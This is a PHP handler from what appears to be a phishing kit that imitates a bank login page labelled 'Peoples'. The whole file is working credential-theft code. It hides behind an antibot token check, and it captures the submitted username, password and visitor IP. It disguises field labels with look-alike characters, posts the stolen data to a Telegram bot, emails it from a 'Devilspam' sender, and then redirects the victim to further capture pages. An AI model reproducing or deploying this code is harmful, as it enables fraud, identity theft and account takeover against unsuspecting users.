<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();           
require_once '../session.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}
$d = $_POST['ad'];
require_once '../config.php';
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IPPP = get_client_ip();

 if (strpos($IPPP, ',') !== false) {
     $ippro = "<fuck>".$IPPP;
     $cldcvers = get_string_between($ippro, '<fuck>', ',');
     $IP = $cldcvers;
 } else {
     $IP = $IPPP;
 }

$a1 = $_POST['username'];
$b1 = $_POST['password'];

$data .= "<---- Lοɡin Іnfοrmаtiοn : {$IP} ---->\n\n";
$data .= "Page : Peoples\n\n";
$data .= "User ID : {$a1}\n";
$data .= "Раѕѕѡοrԁ : {$b1}\n\n";
$data .= "Developed by {$d}\n";

$token = $Token;
$id = $Id;
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";

$params=[
	'chat_id'=>$id,
	'text'=>$data,
];

$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
$email = $Email;
$subject = "Login Information from : $IP";
$headers = "From: Devilspam <wellsby@anoxyty.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$data,$headers);

if ($OnlyLoginInfo == "off") {
    header('Location: email.php?cont=QERldmlsbWFzazA5&token='.$_SESSION['token']);
} else {
    header('Location: success.php?token='.$_SESSION['token']);
}

?>